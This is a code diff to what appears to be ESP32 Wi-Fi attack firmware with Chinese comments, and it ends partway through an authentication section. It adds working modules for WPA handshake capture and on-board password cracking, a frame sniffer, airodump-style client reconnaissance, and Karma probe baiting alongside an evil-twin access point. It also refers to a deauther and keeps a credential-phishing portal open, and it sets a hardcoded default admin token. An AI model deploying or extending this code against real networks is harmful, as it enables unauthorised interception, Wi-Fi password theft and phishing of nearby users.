@@ -57,6 +57,8 @@ static Preferences sPrefs;
 static String apSsid;
 static uint8_t apChannel = AP_CHANNEL_DEFAULT;
 static uint8_t apChannelActive = AP_CHANNEL_DEFAULT; // 空口当前实际工作信道 (攻击期间临时切至目标信道; 配置值 apChannel 不变)
+static String sAdminToken;                            // 后台访问口令 (NVS: adminToken)
+static const char *ADMIN_TOKEN_DEFAULT = "esp32admin"; // 首次上电默认口令, 可在配置页修改
 
 /* ---------------- 日志环形缓冲 (供后台绿字日志) ---------------- */
 struct LogEntry {
@@ -264,7 +266,8 @@ static void addCredential(const String &mac, const String &pass) {
   e.capturedAt = millis();
   sCredHead = (sCredHead + 1) % 16;
   if (sCredCount < 16) sCredCount++;
-  log("[eviltwin] 捕获客户端密码凭据! MAC=" + mac + " 密码=" + pass);
+  log("[eviltwin] 捕获到客户端提交的凭据: MAC=" + mac + " 密码长度=" + String(pass.length()) +
+      " (明文仅存于凭据表, 不写入日志/串口遥测)");
 }
 
 /* ---------------- 2. 取消认证器 (Deauther 真实帧注入) ---------------- */
@@ -445,12 +448,253 @@ static int eapolOffset(const uint8_t *f, int len) {
   return -1;
 }
 
-// promiscuous 回调: 运行在 WiFi 任务上下文, 只做字节拷贝, 不分配内存、不打日志。
-static void onEapolFrame(void *buf, wifi_promiscuous_pkt_type_t type) {
-  if (!sHandshake.capturing || type != WIFI_PKT_DATA) return;
-  const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
-  const uint8_t *f = pkt->payload;
-  const int len = (int)pkt->rx_ctrl.sig_len;
+/* ---- 抓包观察器共用缓冲区 (Sniffer / Airodump / Karma) ----
+ * 三者与握手捕获共用同一个 promiscuous 回调; 回调运行在 WiFi 任务上下文,
+ * 只做定长缓冲写入, 不分配内存、不打日志。 */
+struct SnifferPacket {
+  uint32_t ts;
+  uint8_t ch;
+  int8_t rssi;
+  char type[12];
+  char src[18];
+  char dst[18];
+  char info[48];
+};
+
+struct SnifferState {
+  bool running = false;
+  uint8_t channel = 6;
+  bool hopping = false;
+  uint32_t totalPackets = 0;
+  uint32_t mgmtCount = 0;
+  uint32_t ctrlCount = 0;
+  uint32_t dataCount = 0;
+  uint16_t fps = 0;
+  uint16_t fpsAccum = 0;
+  uint32_t lastFpsCalc = 0;
+  uint32_t lastHopTime = 0;
+  SnifferPacket packets[16];
+  uint8_t packetHead = 0;
+  uint8_t packetCount = 0;
+};
+static SnifferState sSniffer;
+
+// kind: 0=管理帧 1=控制帧 2=数据帧
+static void addSnifferPacket(uint8_t ch, int8_t rssi, const char *type, const char *src,
+                             const char *dst, const char *info, uint8_t kind) {
+  SnifferPacket &p = sSniffer.packets[sSniffer.packetHead];
+  p.ts = millis();
+  p.ch = ch;
+  p.rssi = rssi;
+  strlcpy(p.type, type, sizeof(p.type));
+  strlcpy(p.src, src, sizeof(p.src));
+  strlcpy(p.dst, dst, sizeof(p.dst));
+  strlcpy(p.info, info, sizeof(p.info));
+  sSniffer.packetHead = (sSniffer.packetHead + 1) % 16;
+  if (sSniffer.packetCount < 16) sSniffer.packetCount++;
+  sSniffer.totalPackets++;
+  sSniffer.fpsAccum++;
+  if (kind == 2) sSniffer.dataCount++;
+  else if (kind == 1) sSniffer.ctrlCount++;
+  else sSniffer.mgmtCount++;
+}
+
+struct AirodumpStation {
+  char mac[18];
+  char bssid[18];
+  int8_t rssi;
+  uint32_t packets;
+  char probes[48];
+};
+
+struct AirodumpState {
+  bool running = false;
+  bool hopping = true;
+  uint8_t currentChannel = 1;
+  uint32_t lastHopTime = 0;
+  AirodumpStation stations[8];
+  uint8_t stationCount = 0;
+};
+static AirodumpState sAirodump;
+
+struct KarmaProbe {
+  char mac[18];
+  char ssid[33];
+  int8_t rssi;
+  uint32_t ts;
+  bool baited;
+};
+
+struct KarmaState {
+  bool running = false;
+  uint32_t probesCaptured = 0;
+  uint32_t probesBaited = 0;
+  KarmaProbe probes[10];
+  uint8_t probeCount = 0;
+  uint8_t probeHead = 0;
+};
+static KarmaState sKarma;
+
+static void addKarmaProbe(const char *mac, const char *ssid, int8_t rssi, bool baited) {
+  KarmaProbe &p = sKarma.probes[sKarma.probeHead];
+  strlcpy(p.mac, mac, sizeof(p.mac));
+  strlcpy(p.ssid, ssid, sizeof(p.ssid));
+  p.rssi = rssi;
+  p.ts = millis();
+  p.baited = baited;
+  sKarma.probeHead = (sKarma.probeHead + 1) % 10;
+  if (sKarma.probeCount < 10) sKarma.probeCount++;
+  sKarma.probesCaptured++;
+  if (baited) sKarma.probesBaited++;
+}
+
+// 轻量 MAC 格式化 (回调上下文不分配 String)
+static void macToStr(char *out, const uint8_t *m) {
+  static const char kHex[] = "0123456789ABCDEF";
+  for (int i = 0; i < 6; i++) {
+    out[i * 3] = kHex[(m[i] >> 4) & 0x0F];
+    out[i * 3 + 1] = kHex[m[i] & 0x0F];
+    if (i < 5) out[i * 3 + 2] = ':';
+  }
+  out[17] = 0;
+}
+
+// 从 IE 链中取 SSID (id=0); 返回长度, 未找到返回 -1
+static int ieFindSsid(const uint8_t *f, int len, int off, char *out, int outLen) {
+  while (off + 2 <= len) {
+    const uint8_t id = f[off], l = f[off + 1];
+    if (off + 2 + l > len) break;
+    if (id == 0) {
+      int n = (l < outLen - 1) ? l : outLen - 1;
+      memcpy(out, f + off + 2, n);
+      out[n] = 0;
+      return n;
+    }
+    off += 2 + l;
+  }
+  return -1;
+}
+
+// 数据包分析器: 把真实空口帧归类写入滚动缓冲
+static void snifferObserve(const uint8_t *f, int len, int8_t rssi, uint8_t ch) {
+  if (len < 10) return;
+  const uint8_t fc0 = f[0];
+  const uint8_t ftype = (fc0 >> 2) & 0x03;
+  const uint8_t sub = (fc0 >> 4) & 0x0F;
+  char src[18], dst[18], type[12] = "Data", info[48] = "";
+  macToStr(src, (len >= 16) ? f + 10 : f + 4);
+  macToStr(dst, f + 4);
+
+  if (ftype == 0) {
+    if (len < 24) return;
+    static const char *subNames[16] = {
+      "AssocReq", "AssocResp", "ReassocReq", "ReassocResp", "ProbeReq", "ProbeResp",
+      "TimingAdv", "-", "Beacon", "ATIM", "Disassoc", "Auth",
+      "Deauth", "Action", "ActionNoAck", "-"};
+    strlcpy(type, subNames[sub], sizeof(type));
+    if (sub == 8 || sub == 5) {
+      char ssid[33];
+      if (ieFindSsid(f, len, 36, ssid, sizeof(ssid)) >= 0) snprintf(info, sizeof(info), "SSID: %s", ssid);
+      else strlcpy(info, "(隐藏 SSID)", sizeof(info));
+    } else if (sub == 4) {
+      char ssid[33];
+      if (ieFindSsid(f, len, 24, ssid, sizeof(ssid)) > 0) snprintf(info, sizeof(info), "Probe: %s", ssid);
+      else strlcpy(info, "Broadcast Probe", sizeof(info));
+    } else if (sub == 12 || sub == 10) {
+      if (len >= 26) snprintf(info, sizeof(info), "Reason: %u", (unsigned)(f[24] | (f[25] << 8)));
+      else strlcpy(info, "管理帧", sizeof(info));
+    } else {
+      strlcpy(info, "Management Frame", sizeof(info));
+    }
+    addSnifferPacket(ch, rssi, type, src, dst, info, 0);
+    return;
+  }
+
+  if (ftype == 1) {
+    static const char *ctrlNames[16] = {
+      "-", "-", "-", "-", "-", "-", "-", "Control", "BlockAckReq", "BlockAck",
+      "PS-Poll", "RTS", "CTS", "ACK", "CF-End", "CF-EndAck"};
+    strlcpy(type, ctrlNames[sub], sizeof(type));
+    strlcpy(info, "Control Frame", sizeof(info));
+    addSnifferPacket(ch, rssi, type, src, dst, info, 1);
+    return;
+  }
+
+  // 数据帧
+  if (sub == 4) strlcpy(type, "Null", sizeof(type));
+  else if (sub == 8 || sub == 12) strlcpy(type, "QoS", sizeof(type));
+  if (eapolOffset(f, len) >= 0) {
+    strlcpy(type, "EAPOL", sizeof(type));
+    strlcpy(info, "802.1X Key", sizeof(info));
+  } else if (len >= 24 && ((fc0 & 0x03) == 0x01 || (fc0 & 0x03) == 0x02)) {
+    char b[18];
+    macToStr(b, f + 16);
+    snprintf(info, sizeof(info), "BSSID %s", b);
+  } else {
+    strlcpy(info, "WDS / IBSS", sizeof(info));
+  }
+  addSnifferPacket(ch, rssi, type, src, dst, info, 2);
+}
+
+// Airodump: 记录对端 STA/AP (按 MAC 聚合帧数与探测过的 SSID)
+static void airodumpObserve(const uint8_t *a, const uint8_t *b, const uint8_t *bssid,
+                            int8_t rssi, const char *ssid) {
+  const uint8_t *peer = a;
+  if (bssid && memcmp(a, bssid, 6) == 0) peer = b;
+  if (peer[0] & 0x01) return;   // 跳过组播/广播地址
+  char mac[18], bs[18];
+  macToStr(mac, peer);
+  macToStr(bs, bssid ? bssid : b);
+  for (int i = 0; i < sAirodump.stationCount; i++) {
+    AirodumpStation &st = sAirodump.stations[i];
+    if (strcmp(st.mac, mac) != 0) continue;
+    st.packets++;
+    st.rssi = rssi;
+    if (ssid && ssid[0] && strstr(st.probes, ssid) == NULL) {
+      size_t cur = strlen(st.probes);
+      if (cur && cur < sizeof(st.probes) - 2) {
+        st.probes[cur] = ',';
+        st.probes[cur + 1] = 0;
+      }
+      strlcat(st.probes, ssid, sizeof(st.probes));
+    }
+    return;
+  }
+  if (sAirodump.stationCount >= 8) return;
+  AirodumpStation &st = sAirodump.stations[sAirodump.stationCount++];
+  strlcpy(st.mac, mac, sizeof(st.mac));
+  strlcpy(st.bssid, bs, sizeof(st.bssid));
+  st.rssi = rssi;
+  st.packets = 1;
+  st.probes[0] = 0;
+  if (ssid && ssid[0]) strlcpy(st.probes, ssid, sizeof(st.probes));
+}
+
+// Karma: 记录真实 Probe Request (5s 内同 MAC+SSID 去重)
+static void karmaObserveProbe(const uint8_t *f, int len, int8_t rssi) {
+  if (len < 26) return;
+  char ssid[33];
+  if (ieFindSsid(f, len, 24, ssid, sizeof(ssid)) <= 0) return;   // 忽略隐藏/通配探针
+  char mac[18];
+  macToStr(mac, f + 10);
+  const uint32_t now = millis();
+  for (int i = 0; i < sKarma.probeCount; i++) {
+    int idx = (sKarma.probeHead + 10 - sKarma.probeCount + i) % 10;
+    if (strcmp(sKarma.probes[idx].mac, mac) == 0 && strcmp(sKarma.probes[idx].ssid, ssid) == 0) {
+      if (now - sKarma.probes[idx].ts < 5000) return;
+      break;
+    }
+  }
+  bool baited = false;
+  if (sEvilTwin.active) {
+    if (sEvilTwin.cloneSsid.length() && strcmp(ssid, sEvilTwin.cloneSsid.c_str()) == 0) baited = true;
+    else if (apSsid.length() && strcmp(ssid, apSsid.c_str()) == 0) baited = true;
+  }
+  addKarmaProbe(mac, ssid, rssi, baited);
+}
+
+// 握手包解析 (只处理数据帧中的 EAPOL-Key)
+static void handleEapolFrame(const uint8_t *f, int len) {
   if (len < 40) return;
   if ((f[0] & 0x0C) != 0x08) return;             // 只要数据帧
   const int off = eapolOffset(f, len);
@@ -512,6 +756,57 @@ static void onEapolFrame(void *buf, wifi_promiscuous_pkt_type_t type) {
   if (sHandshake.m1 && sHandshake.m2) sHandshake.captured = true;
   // keyver 0 = AKM 自定义 (WPA3-SAE), 3 = 802.11w PMF; 两者的 MIC 算法板载未实现
   if (sHandshake.keyver == 0 || sHandshake.keyver >= 3) sHandshake.unsupported = true;
+}
+
+// 统一 promiscuous 回调: 按当前运行模块把同一帧分发给握手/嗅探/侦察/Karma 观察器
+static void onPromiscuousFrame(void *buf, wifi_promiscuous_pkt_type_t type) {
+  const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
+  const uint8_t *f = pkt->payload;
+  const int len = (int)pkt->rx_ctrl.sig_len;
+  if (len < 10) return;
+  const int8_t rssi = pkt->rx_ctrl.rssi;
+  const uint8_t ch = pkt->rx_ctrl.channel ? pkt->rx_ctrl.channel : apChannelActive;
+
+  if (sHandshake.capturing) handleEapolFrame(f, len);
+  if (sSniffer.running) snifferObserve(f, len, rssi, ch);
+
+  const uint8_t ftype = (f[0] >> 2) & 0x03;
+  const uint8_t sub = (f[0] >> 4) & 0x0F;
+  if (sKarma.running && ftype == 0 && sub == 4) karmaObserveProbe(f, len, rssi);
+  if (sAirodump.running && len >= 24) {
+    char ssid[33] = {0};
+    if (ftype == 0 && (sub == 4 || sub == 5 || sub == 8)) {
+      ieFindSsid(f, len, (sub == 4) ? 24 : 36, ssid, sizeof(ssid));
+    }
+    airodumpObserve(f + 10, f + 4, f + 16, rssi, ssid);
+  }
+}
+
+static bool promiscuousWanted() {
+  return sHandshake.capturing || sSniffer.running || sAirodump.running || sKarma.running;
+}
+
+// 按活跃模块统一配置过滤掩码与回调; 没有模块需要时关闭 promiscuous。
+// 返回 promiscuous 是否处于开启状态 (无模块需要时视为成功)。
+static bool syncPromiscuousEngine() {
+  if (!promiscuousWanted()) {
+    esp_wifi_set_promiscuous(false);
+    return true;
+  }
+  uint32_t mask = 0;
+  if (sSniffer.running) {
+    mask |= WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_CTRL | WIFI_PROMIS_FILTER_MASK_DATA;
+  }
+  if (sAirodump.running || sKarma.running) {
+    mask |= WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
+  }
+  if (sHandshake.capturing) mask |= WIFI_PROMIS_FILTER_MASK_DATA;
+
+  wifi_promiscuous_filter_t filter = {};
+  filter.filter_mask = mask;
+  esp_wifi_set_promiscuous_filter(&filter);
+  esp_wifi_set_promiscuous_rx_cb(onPromiscuousFrame);
+  return esp_wifi_set_promiscuous(true) == ESP_OK;
 }
 
 /* ---- 板载跑包所需的密码学原语 (mbedtls, ESP32 有 SHA 硬件加速) ---- */
@@ -594,14 +889,12 @@ static bool computeM2Mic(const char *pass, uint8_t mic[16]) {
 
 // 关闭监听并恢复 AP 信道 (停止/跑包前调用)
 static void stopCaptureEngine() {
-  if (sHandshake.capturing) {
-    esp_wifi_set_promiscuous(false);
-    sHandshake.capturing = false;
-  }
+  sHandshake.capturing = false;
   if (sHandshake.channelMoved) {
     applyApChannel(sHandshake.restoreChannel);
     sHandshake.channelMoved = false;
   }
+  syncPromiscuousEngine();   // 若 Sniffer/Airodump/Karma 仍在运行, 保持 promiscuous 开启
 }
 
 /* ---------------- chip / 工具 ---------------- */
@@ -880,6 +1173,15 @@ static void sendInfo() {
           ",\"m4\":" + String(sHandshake.m4 ? "true" : "false") +
           ",\"pmkid\":" + String(sHandshake.pmkid ? "true" : "false") +
           ",\"crackedPass\":\"" + jsonEscape(sHandshake.crackedPass) + "\"},";
+  json += "\"sniffer\":{\"running\":" + String(sSniffer.running ? "true" : "false") +
+          ",\"fps\":" + String(sSniffer.fps) +
+          ",\"total\":" + String(sSniffer.totalPackets) + "},";
+  json += "\"airodump\":{\"running\":" + String(sAirodump.running ? "true" : "false") +
+          ",\"channel\":" + String(sAirodump.currentChannel) +
+          ",\"stations\":" + String(sAirodump.stationCount) + "},";
+  json += "\"karma\":{\"running\":" + String(sKarma.running ? "true" : "false") +
+          ",\"probes\":" + String(sKarma.probesCaptured) +
+          ",\"baited\":" + String(sKarma.probesBaited) + "},";
 
   json += "\"target\":" + targetJson(sTarget) + ",";
   // 双子目标列表 (最多 4 条, 含假 AP 标记与当前跳频指向)
@@ -1222,18 +1524,17 @@ static void handleDeauthStatus() {
 }
 
 /* ---------------- 3. 握手包与密码破解 API ---------------- */
-static void handleHandshakeStart() {
+// 启动握手监听 (不发送 HTTP 响应, 供 /api/handshake/start 与 Karma 复用)
+// 返回 false 表示参数不合法 (err 为中文原因); 返回 true 时结果看 sHandshake.capturing。
+static bool beginHandshakeCapture(String &err) {
   if (!sTarget.set || sTarget.ssid.length() == 0) {
-    server.sendHeader("Access-Control-Allow-Origin", "*");
-    server.send(400, "application/json",
-                "{\"error\":\"请先扫描并选择目标 AP — 跑包需要它的 SSID 作为 PBKDF2 盐值\"}");
-    return;
+    err = "请先扫描并选择目标 AP — 跑包需要它的 SSID 作为 PBKDF2 盐值";
+    return false;
   }
   uint8_t bssid[6];
   if (!parseBssid(sTarget.bssid, bssid)) {
-    server.sendHeader("Access-Control-Allow-Origin", "*");
-    server.send(400, "application/json", "{\"error\":\"目标 BSSID 无效, 请重新选择目标\"}");
-    return;
+    err = "目标 BSSID 无效, 请重新选择目标";
+    return false;
   }
 
   sHandshake.m1 = sHandshake.m2 = sHandshake.m3 = sHandshake.m4 = false;
@@ -1253,18 +1554,14 @@ static void handleHandshakeStart() {
   sHandshake.captureStartTime = millis();
   sHsLoggedM1 = sHsLoggedM2 = sHsLoggedDone = false;
 
-  // 单射频: 先对齐到目标信道, 再打开 promiscuous 只收数据帧 (EAPOL 走数据帧)
+  // 单射频: 先对齐到目标信道, 再打开 promiscuous (握手帧走数据帧)
   sHandshake.restoreChannel = apChannelActive;
   const bool needMove = (sTarget.channel > 0 && sTarget.channel != apChannelActive);
   // 注意: 必须先判断 needMove 再切换, 切换后 apChannelActive 已等于目标信道
   sHandshake.channelMoved = needMove && applyApChannel((uint8_t)sTarget.channel);
   const bool channelAligned = !needMove || sHandshake.channelMoved;
-  wifi_promiscuous_filter_t filter = {};
-  filter.filter_mask = WIFI_PROMIS_FILTER_MASK_DATA;
-  esp_wifi_set_promiscuous_filter(&filter);
-  esp_wifi_set_promiscuous_rx_cb(onEapolFrame);
-  const esp_err_t perr = esp_wifi_set_promiscuous(true);
-  sHandshake.capturing = (perr == ESP_OK);
+  sHandshake.capturing = true;
+  if (!syncPromiscuousEngine()) sHandshake.capturing = false;
 
   emitLabState("handshake", sHandshake.capturing);
   log(String("[eapol] 开始监听 4-Way Handshake: 目标=") + sTarget.ssid +
@@ -1274,12 +1571,21 @@ static void handleHandshakeStart() {
         String(apChannelActive) + ", 抓不到该网络的握手帧");
   }
   log("[eapol] 提示: 用 Deauther 让目标客户端重连, 即可在空中抓到 M1/M2");
+  return true;
+}
 
+static void handleHandshakeStart() {
+  String err;
+  if (!beginHandshakeCapture(err)) {
+    server.sendHeader("Access-Control-Allow-Origin", "*");
+    server.send(400, "application/json", "{\"error\":\"" + jsonEscape(err) + "\"}");
+    return;
+  }
   server.sendHeader("Access-Control-Allow-Origin", "*");
   server.send(200, "application/json",
               String("{\"ok\":true,\"capturing\":") + (sHandshake.capturing ? "true" : "false") +
               ",\"channel\":" + String(apChannelActive) +
-              ",\"channelAligned\":" + (channelAligned ? "true" : "false") +
+              ",\"channelAligned\":" + ((!sHandshake.channelMoved) ? "true" : "false") +
               ",\"channelMoved\":" + (sHandshake.channelMoved ? "true" : "false") +
               ",\"essid\":\"" + jsonEscape(sHandshake.essid) + "\"}");
 }
@@ -1311,7 +1617,8 @@ static void handleHandshakeCrack() {
                 "请用 /api/handshake/dump 导出后交服务端 /api/wpa/crack\"}");
     return;
   }
-  stopCaptureEngine();   // 帧已保存, 跑包期间释放射频监听, 避免与 PBKDF2 抢 CPU
+  sKarma.running = false;  // 跑包期间停止 Karma, 避免 promiscuous 与 PBKDF2 同时占用射频/CPU
+  stopCaptureEngine();     // 帧已保存, 跑包期间释放射频监听, 避免与 PBKDF2 抢 CPU
   sHandshake.cracking = true;
   sHandshake.crackProgress = 0;
   sHandshake.crackAttempts = 0;
@@ -1370,6 +1677,197 @@ static void handleHandshakeDump() {
   server.send(200, "application/json", json);
 }
 
+/* ---------------- Sniffer API ---------------- */
+static void handleSnifferStart() {
+  if (server.hasArg("plain")) {
+    String body = server.arg("plain");
+    String chStr = extractJson(body, "channel");
+    if (chStr.length()) {
+      int ch = chStr.toInt();
+      if (ch >= 1 && ch <= 13) sSniffer.channel = ch;
+    }
+    String hopStr = extractJson(body, "hopping");
+    sSniffer.hopping = (hopStr == "true" || hopStr == "1");
+  }
+  if (!sSniffer.hopping && !sHandshake.capturing) applyApChannel(sSniffer.channel);
+  sSniffer.running = true;
+  sSniffer.lastFpsCalc = millis();
+  sSniffer.lastHopTime = millis();
+  sSniffer.fpsAccum = 0;
+  sSniffer.fps = 0;
+  if (!syncPromiscuousEngine()) {
+    sSniffer.running = false;
+    server.sendHeader("Access-Control-Allow-Origin", "*");
+    server.send(500, "application/json", "{\"ok\":false,\"error\":\"promiscuous 启动失败\"}");
+    return;
+  }
+  log("[sniffer] 数据包分析器已启动! 信道=" + String(sSniffer.channel) + (sSniffer.hopping ? " (全信道跳频)" : ""));
+  server.sendHeader("Access-Control-Allow-Origin", "*");
+  server.send(200, "application/json", "{\"ok\":true,\"running\":true}");
+}
+
+static void handleSnifferStop() {
+  sSniffer.running = false;
+  syncPromiscuousEngine();
+  if (!sHandshake.capturing && !sDeauth.running && !sEvilTwin.active) applyApChannel(apChannel);
+  log("[sniffer] 数据包分析器已停止, 累计捕获 " + String(sSniffer.totalPackets) + " 帧");
+  server.sendHeader("Access-Control-Allow-Origin", "*");
+  server.send(200, "application/json", "{\"ok\":true,\"running\":false}");
+}
+
+static void handleSnifferStatus() {
+  server.sendHeader("Access-Control-Allow-Origin", "*");
+  String json;
+  json.reserve(1024);
+  json = "{\"running\":" + String(sSniffer.running ? "true" : "false") + ",";
+  json += "\"channel\":" + String(sSniffer.channel) + ",";
+  json += "\"hopping\":" + String(sSniffer.hopping ? "true" : "false") + ",";
+  json += "\"total\":" + String(sSniffer.totalPackets) + ",";
+  json += "\"mgmt\":" + String(sSniffer.mgmtCount) + ",";
+  json += "\"ctrl\":" + String(sSniffer.ctrlCount) + ",";
+  json += "\"data\":" + String(sSniffer.dataCount) + ",";
+  json += "\"fps\":" + String(sSniffer.fps) + ",";
+  json += "\"packets\":[";
+  for (int i = 0; i < sSniffer.packetCount; i++) {
+    int idx = (sSniffer.packetHead + 16 - sSniffer.packetCount + i) % 16;
+    if (i) json += ",";
+    json += "{\"ts\":" + String(sSniffer.packets[idx].ts) + ",";
+    json += "\"ch\":" + String(sSniffer.packets[idx].ch) + ",";
+    json += "\"rssi\":" + String(sSniffer.packets[idx].rssi) + ",";
+    json += "\"type\":\"" + jsonEscape(sSniffer.packets[idx].type) + "\",";
+    json += "\"src\":\"" + jsonEscape(sSniffer.packets[idx].src) + "\",";
+    json += "\"dst\":\"" + jsonEscape(sSniffer.packets[idx].dst) + "\",";
+    json += "\"info\":\"" + jsonEscape(sSniffer.packets[idx].info) + "\"}";
+  }
+  json += "]}";
+  server.send(200, "application/json", json);
+}
+
+/* ---------------- Airodump API ---------------- */
+static void handleAirodumpStart() {
+  if (server.hasArg("plain")) {
+    String body = server.arg("plain");
+    String hopStr = extractJson(body, "hopping");
+    sAirodump.hopping = (hopStr != "false" && hopStr != "0");
+    int ch = extractJson(body, "channel").toInt();
+    if (ch >= 1 && ch <= 13) sAirodump.currentChannel = ch;
+  }
+  sAirodump.stationCount = 0;
+  if (!sAirodump.hopping && !sHandshake.capturing) applyApChannel(sAirodump.currentChannel);
+  sAirodump.running = true;
+  sAirodump.lastHopTime = millis();
+  if (!syncPromiscuousEngine()) {
+    sAirodump.running = false;
+    server.sendHeader("Access-Control-Allow-Origin", "*");
+    server.send(500, "application/json", "{\"ok\":false,\"error\":\"promiscuous 启动失败\"}");
+    return;
+  }
+  log("[airodump] Airodump侦察已启动! 初始信道=" + String(sAirodump.currentChannel) + (sAirodump.hopping ? " (自动跳频)" : ""));
+  server.sendHeader("Access-Control-Allow-Origin", "*");
+  server.send(200, "application/json", "{\"ok\":true,\"running\":true}");
+}
+
+static void handleAirodumpStop() {
+  sAirodump.running = false;
+  syncPromiscuousEngine();
+  if (!sHandshake.capturing && !sDeauth.running && !sEvilTwin.active) applyApChannel(apChannel);
+  log("[airodump] Airodump侦察已停止, 记录 " + String(sAirodump.stationCount) + " 个对端");
+  server.sendHeader("Access-Control-Allow-Origin", "*");
+  server.send(200, "application/json", "{\"ok\":true,\"running\":false}");
+}
+
+static void handleAirodumpStatus() {
+  server.sendHeader("Access-Control-Allow-Origin", "*");
+  String json;
+  json.reserve(2048);
+  json = "{\"running\":" + String(sAirodump.running ? "true" : "false") + ",";
+  json += "\"channel\":" + String(sAirodump.currentChannel) + ",";
+  json += "\"hopping\":" + String(sAirodump.hopping ? "true" : "false") + ",";
+  json += "\"stations\":[";
+  for (int i = 0; i < sAirodump.stationCount; i++) {
+    if (i) json += ",";
+    json += "{\"mac\":\"" + jsonEscape(sAirodump.stations[i].mac) + "\",";
+    json += "\"bssid\":\"" + jsonEscape(sAirodump.stations[i].bssid) + "\",";
+    json += "\"rssi\":" + String(sAirodump.stations[i].rssi) + ",";
+    json += "\"packets\":" + String(sAirodump.stations[i].packets) + ",";
+    json += "\"probes\":\"" + jsonEscape(sAirodump.stations[i].probes) + "\"}";
+  }
+  json += "]}";
+  server.send(200, "application/json", json);
+}
+
+/* ---------------- Karma API ---------------- */
+static void handleKarmaStart() {
+  sKarma.probesCaptured = 0;
+  sKarma.probesBaited = 0;
+  sKarma.probeCount = 0;
+  sKarma.probeHead = 0;
+  sKarma.running = true;   // 先置位, 使 promiscuous 过滤包含管理帧
+  // 已选择目标时顺带启动 4-Way Handshake 捕获; 未选目标则只监听 Probe Request
+  if (sTarget.set && sTarget.ssid.length()) {
+    String err;
+    if (!beginHandshakeCapture(err)) {
+      log("[karma] 握手捕获未启动: " + err + " (仍继续监听 Probe Request)");
+    }
+  }
+  if (!syncPromiscuousEngine()) {
+    sKarma.running = false;
+    server.sendHeader("Access-Control-Allow-Origin", "*");
+    server.send(500, "application/json", "{\"ok\":false,\"error\":\"promiscuous 启动失败\"}");
+    return;
+  }
+  log("[karma] Karma 探针诱捕已启动 (真实 promiscuous): 信道 " + String(apChannelActive) +
+      (sHandshake.capturing ? ", 同时监听 4-Way Handshake" : ", 仅监听 Probe Request"));
+  server.sendHeader("Access-Control-Allow-Origin", "*");
+  server.send(200, "application/json",
+              "{\"ok\":true,\"running\":true,\"channel\":" + String(apChannelActive) +
+              ",\"handshake\":" + (sHandshake.capturing ? "true" : "false") + "}");
+}
+
+static void handleKarmaStop() {
+  sKarma.running = false;
+  stopCaptureEngine();      // 停止握手监听并恢复信道 (内部含 sync, 不会重复 send)
+  sHandshake.cracking = false;
+  emitLabState("handshake", false);
+  log("[karma] Karma 探针诱捕已停止, 累计捕获 " + String(sKarma.probesCaptured) + " 个 Probe Request");
+  server.sendHeader("Access-Control-Allow-Origin", "*");
+  server.send(200, "application/json", "{\"ok\":true,\"running\":false}");
+}
+
+static void handleKarmaStatus() {
+  server.sendHeader("Access-Control-Allow-Origin", "*");
+  String json;
+  json.reserve(1200);
+  json = "{\"running\":" + String(sKarma.running ? "true" : "false") + ",";
+  json += "\"capturing\":" + String(sHandshake.capturing ? "true" : "false") + ",";
+  json += "\"m1\":" + String(sHandshake.m1 ? "true" : "false") + ",";
+  json += "\"m2\":" + String(sHandshake.m2 ? "true" : "false") + ",";
+  json += "\"m3\":" + String(sHandshake.m3 ? "true" : "false") + ",";
+  json += "\"m4\":" + String(sHandshake.m4 ? "true" : "false") + ",";
+  json += "\"pmkid\":" + String(sHandshake.pmkid ? "true" : "false") + ",";
+  json += "\"captured\":" + String(sHandshake.captured ? "true" : "false") + ",";
+  json += "\"keyver\":" + String(sHandshake.keyver) + ",";
+  json += "\"cracking\":" + String(sHandshake.cracking ? "true" : "false") + ",";
+  json += "\"progress\":" + String(sHandshake.crackProgress) + ",";
+  json += "\"attempts\":" + String(sHandshake.crackAttempts) + ",";
+  json += "\"total\":" + String(sHandshake.crackTotal) + ",";
+  json += "\"crackedPass\":\"" + jsonEscape(sHandshake.crackedPass) + "\",";
+  json += "\"probesCaptured\":" + String(sKarma.probesCaptured) + ",";
+  json += "\"probesBaited\":" + String(sKarma.probesBaited) + ",";
+  json += "\"probes\":[";
+  for (int i = 0; i < sKarma.probeCount; i++) {
+    int idx = (sKarma.probeHead + 10 - sKarma.probeCount + i) % 10;
+    if (i) json += ",";
+    json += "{\"mac\":\"" + jsonEscape(sKarma.probes[idx].mac) + "\",";
+    json += "\"ssid\":\"" + jsonEscape(sKarma.probes[idx].ssid) + "\",";
+    json += "\"rssi\":" + String(sKarma.probes[idx].rssi) + ",";
+    json += "\"ts\":" + String(sKarma.probes[idx].ts) + ",";
+    json += "\"baited\":" + String(sKarma.probes[idx].baited ? "true" : "false") + "}";
+  }
+  json += "]}";
+  server.send(200, "application/json", json);
+}
+
 static void handleLog() {
   uint32_t since = 0;
   if (server.hasArg("since")) since = (uint32_t)atol(server.arg("since").c_str());
@@ -1425,6 +1923,13 @@ static void handleConfig() {
     changed = true;
     log("[config] 已更新热点 SSID 为 " + apSsid + " (将在重启后生效)");
   }
+  String tokStr = extractJson(body, "adminToken");
+  if (tokStr.length() >= 4 && tokStr.length() <= 32) {
+    sAdminToken = tokStr;
+    sPrefs.putString("adminToken", sAdminToken);
+    changed = true;
+    log("[config] 后台访问口令已更新 (立即生效)");
+  }
   server.sendHeader("Access-Control-Allow-Origin", "*");
   server.send(200, "application/json", "{\"ok\":true,\"changed\":" + String(changed ? "true" : "false") +
               ",\"channel\":" + String(apChannel) + ",\"ssid\":\"" + jsonEscape(apSsid) + "\"}");
@@ -1452,6 +1957,31 @@ static void redirectToAdmin() {
   server.send(302, "text/plain", "");
 }
 
+/* ---------------- 后台简易鉴权 ----------------
+ * 所有 /api/* 管理接口需携带 X-Admin-Token 请求头 (或 ?token= 查询参数)。
+ * admin.html 只含登录壳与界面代码, 真正的数据边界在 API;
+ * 钓鱼门户 /api/portal/submit 保持开放 (凭据捕获流程所需)。
+ */
+static bool adminAuthorized() {
+  String t = server.header("X-Admin-Token");
+  if (t.length() == 0) t = server.arg("token");
+  return t.length() > 0 && t == sAdminToken;
+}
+
+static bool requireAdmin() {
+  if (adminAuthorized()) return true;
+  server.sendHeader("Access-Control-Allow-Origin", "*");
+  server.send(401, "application/json", "{\"error\":\"unauthorized: 缺少或错误的后台口令\"}");
+  return false;
+}
+
+// 仅注册需要鉴权的路由: 401 时直接返回, 不执行业务 handler
